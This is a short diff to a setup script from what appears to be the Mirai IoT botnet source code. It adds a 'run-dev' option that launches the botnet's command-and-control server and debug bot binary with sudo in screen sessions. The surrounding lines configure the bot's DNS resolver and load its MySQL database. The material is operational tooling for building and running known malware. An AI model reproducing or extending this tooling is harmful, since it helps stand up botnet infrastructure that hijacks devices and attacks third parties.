@@ -106,6 +106,10 @@ elif [ $# == 1 ]; then
 		sed -i "s/8,8,8,8/$MIRAI_DNS/" bot/resolv.c
 
 		exit
+	elif [ "$1" == "run-dev" ]; then
+		cd debug
+		screen -S mirai-cnc sudo ./cnc
+		screen -S mirai-bot sudo ./mirai.dbg
 	elif [ "$1" == "mysql-setup" ]; then
 		echo "Setting up MySQL database!"
 		cat ./tools/db.sql | sudo mysql
